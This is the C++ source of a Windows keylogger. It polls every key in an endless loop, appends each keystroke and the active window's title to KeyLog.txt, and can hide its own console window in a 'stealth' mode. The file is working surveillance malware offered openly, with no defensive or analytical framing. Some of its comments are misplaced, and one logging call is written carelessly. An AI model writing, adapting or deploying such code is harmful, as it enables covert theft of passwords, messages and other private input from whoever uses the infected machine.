
//Including header files
#include"KeyLogger_Windows.h"
using namespace std;

// The Log() function writes the key stroke into a output file

int Log(int key)						//'key' has the ASCII equivalent of the key pressed
{
	FILE *output;
	output = fopen("KeyLog.txt", "a+");		//Output is kept in KeyLog.txt
	fprintf(output, "%s", &key);			//The char equivalent of 'key' is sent
	fclose(output);
	return 0;
}

//The main function to monitor the key strokes pressed and send them to the Log() function
void Stealth()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

//Gets the name of the active window and if it is not equal to the window where the last key stroke was made, the window name is Logged
void GetWindowName()
{
	static HWND Old_Window = NULL;		// window where the last key stroke was made
	HWND New_Window;					// Current window where the keystroke is being made
	char Window_Name[MAX_LENGTH];		//stores name of the window
	New_Window = GetForegroundWindow();
	if (Old_Window == NULL || Old_Window != New_Window)
	{
		GetWindowTextA(GetForegroundWindow(), Window_Name, sizeof(Window_Name));	//Gets the title of the foreground window and stores it in Window_name
		Old_Window = New_Window;
		FILE *f = fopen("KeyLog.txt", "a+");
		fputs("\n",f);
		fputs(Window_Name, f);			//Log the name of the window
		fputs("\n", f);
		fclose(f);
	}
}
int main()
{
	char stroke;
	char stealth_choice='y';			
	cout << "\n go stealth? (y/n)";
	cin >> stealth_choice;				//comment this line if u dont want it to ask you
	if (stealth_choice == 'y')			//either start in stealth mode or visible mode
	{
		Stealth();						
		
	}
	while (true)		//goes to an infinite loop so that it can always monitor the key strokes
	{
		for (stroke = 8; stroke <= 160; stroke++)
		{
			if (GetAsyncKeyState(stroke) == -32767)   // when a key is pressed the inbuilt windows function returns -32767 for the particular key stroke
			{
				GetWindowName();	//Gets the name of the active window
				Log(stroke);	//send the keystroke to be logged
			}
		}
	}
	return 0;
}